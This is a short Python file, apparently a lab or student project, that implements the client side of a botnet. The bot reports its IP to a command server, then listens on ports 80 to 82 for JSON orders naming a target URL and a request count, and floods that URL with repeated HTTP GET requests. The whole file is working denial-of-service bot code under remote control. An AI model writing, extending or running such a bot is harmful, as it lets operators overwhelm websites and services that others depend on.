import concurrent
import json
import socket
from concurrent.futures import ThreadPoolExecutor

import requests

# server_address = ('10.0.2.15', 15200)
server_address = ('localhost', 15200)
porte = [80, 81, 82]


def initialize_socket(port):
    """
    Initialize the server and listen for incoming connections.
    :param port: the port to bind the socket to
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_address[0], port))
    s.listen(2)
    while True:
        client, address = s.accept()
        print(f'Client connected: {address}')

        request = client.recv(1024)
        string = request.decode('utf-8')

        data = json.loads(string[string.find('{'):string.find('}') + 1])

        for _ in range(data["number_of_requests"]):
            res = requests.get(data["url"])
            print(res.text)


def initialize_bot():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_address[0], server_address[1]))
    s.send(f'My ip is {s.getsockname()[0]}'.encode('utf-8'))
    s.close()

    print("Bot initialized")

    with ThreadPoolExecutor(max_workers=3) as ex:
        lista_socket = [ex.submit(initialize_socket, i) for i in porte]
        concurrent.futures.wait(lista_socket, return_when=concurrent.futures.ALL_COMPLETED)

        ex.shutdown(wait=True)


if __name__ == '__main__':
    with ThreadPoolExecutor(max_workers=1) as executor:
        x = executor.submit(initialize_bot)

        concurrent.futures.wait([x], return_when=concurrent.futures.ALL_COMPLETED)

        executor.shutdown(wait=True)
